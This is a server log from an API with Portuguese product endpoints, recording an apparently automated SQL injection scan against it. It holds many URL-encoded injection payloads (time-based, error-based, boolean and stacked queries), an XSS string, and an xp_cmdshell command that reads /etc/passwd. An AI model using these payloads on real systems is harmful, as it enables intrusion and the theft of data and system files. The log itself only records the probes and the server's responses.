api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:52542 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3919/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29wwDa%29/%2A%2A/AND/%2A%2A/%28%27CBoI%27%3D%27CBoI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52550 - "GET /produtos%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3919/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29wwDa%29/%2A%2A/AND/%2A%2A/%27XNkK%27%3D%27XNkK HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52552 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3919/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29wwDa%29--/%2A%2A/sRtl HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52566 - "GET /produtos%29/%2A%2A/AND/%2A%2A/9000%3D%28SELECT/%2A%2A/9000/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%282366%3D2366 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52582 - "GET /produtos/%2A%2A/AND/%2A%2A/9000%3D%28SELECT/%2A%2A/9000/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52586 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/9000%3D%28SELECT/%2A%2A/9000/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27Ofdc%27%3D%27Ofdc HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52588 - "GET /produtos%27/%2A%2A/AND/%2A%2A/9000%3D%28SELECT/%2A%2A/9000/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27xsfn%27%3D%27xsfn HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52602 - "GET /produtos/%2A%2A/AND/%2A%2A/9000%3D%28SELECT/%2A%2A/9000/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/RXBr HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52606 - "GET /produtos%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%289830%3D9830 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52620 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52622 - "GET /produtos%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27AzYI%27%3D%27AzYI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52624 - "GET /produtos%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27Pqkj%27%3D%27Pqkj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52628 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/ertw HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52636 - "GET /produtos%29/%2A%2A/AND/%2A%2A/2998%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/AND/%2A%2A/%288817%3D8817 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52650 - "GET /produtos/%2A%2A/AND/%2A%2A/2998%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52660 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/2998%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27BxKE%27%3D%27BxKE HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52672 - "GET /produtos%27/%2A%2A/AND/%2A%2A/2998%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/AND/%2A%2A/%27ceed%27%3D%27ceed HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52676 - "GET /produtos/%2A%2A/AND/%2A%2A/2998%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29--/%2A%2A/nMYN HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52642 - "GET /produtos%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/aYLj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52692 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/tIQX HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52704 - "GET /produtos%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/xBNZ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52720 - "GET /produtos%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/AnNH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52726 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/SFJv HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52766 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52776 - "POST /produtos?zTzd=6503%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52786 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52812 - "GET /produtos/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52830 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52836 - "PUT /produtos/1?kMBf=7381%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52842 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52870 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52884 - "GET /produtos/busca/?nome=teste&WFTG=4148%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52886 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52894 - "GET /produtos/busca/?nome=9994 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52898 - "GET /produtos/busca/?nome=teste%28%29%27.%2C%28%22%29%28%28 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52914 - "GET /produtos/busca/?nome=teste%27DsJSMW%3C%27%22%3ECxpdZo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52930 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52946 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7388%3D2999%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Cgbz%27%3D%27Cgbz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52938 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7883%3D8416%2F%2A%2A%2FAND%2F%2A%2A%2F%27tzns%27%3D%27tzns HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52962 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7172%3D3431%2F%2A%2A%2FAND%2F%2A%2A%2F%285841%3D5841 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52966 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3694%3D5858 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52978 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9528%3D6488--%2F%2A%2A%2FcrQx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52980 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286262%3D4718%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4718%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6322%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52986 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286273%2CCONCAT%280x5c%2C0x7176706271%2C%28SELECT%2F%2A%2A%2F%28ELT%286273%3D6273%2C1%29%29%29%2C0x7170767671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CJRi%27%3D%27CJRi HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52996 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286273%2CCONCAT%280x5c%2C0x7176706271%2C%28SELECT%2F%2A%2A%2F%28ELT%286273%3D6273%2C1%29%29%29%2C0x7170767671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27nVhC%27%3D%27nVhC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53000 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286273%2CCONCAT%280x5c%2C0x7176706271%2C%28SELECT%2F%2A%2A%2F%28ELT%286273%3D6273%2C1%29%29%29%2C0x7170767671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289033%3D9033 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53008 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286273%2CCONCAT%280x5c%2C0x7176706271%2C%28SELECT%2F%2A%2A%2F%28ELT%286273%3D6273%2C1%29%29%29%2C0x7170767671%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53018 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286273%2CCONCAT%280x5c%2C0x7176706271%2C%28SELECT%2F%2A%2A%2F%28ELT%286273%3D6273%2C1%29%29%29%2C0x7170767671%29%29--%2F%2A%2A%2FkaXU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53026 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9474%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289474%3D9474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27uqNx%27%3D%27uqNx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53038 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9474%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289474%3D9474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WlBx%27%3D%27WlBx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53048 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9474%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289474%3D9474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281266%3D1266 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53060 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9474%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289474%3D9474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53028 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9474%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289474%3D9474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FpZoX HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53062 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1565%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281565%3D1565%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wzBb%27%3D%27wzBb HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53064 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1565%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281565%3D1565%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27EkdN%27%3D%27EkdN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53078 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1565%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281565%3D1565%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284176%3D4176 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53092 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1565%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281565%3D1565%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53104 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1565%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281565%3D1565%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FKpri HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53088 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7763%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287763%3D7763%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27FMzl%27%3D%27FMzl HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53122 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7763%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287763%3D7763%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZCgL%27%3D%27ZCgL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53134 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7763%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287763%3D7763%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281203%3D1203 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53110 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7763%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287763%3D7763%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53144 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7763%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287763%3D7763%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2Fcemr HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53150 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qvpbq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289075%3D9075%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qpvvq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53158 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53170 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53174 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53184 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
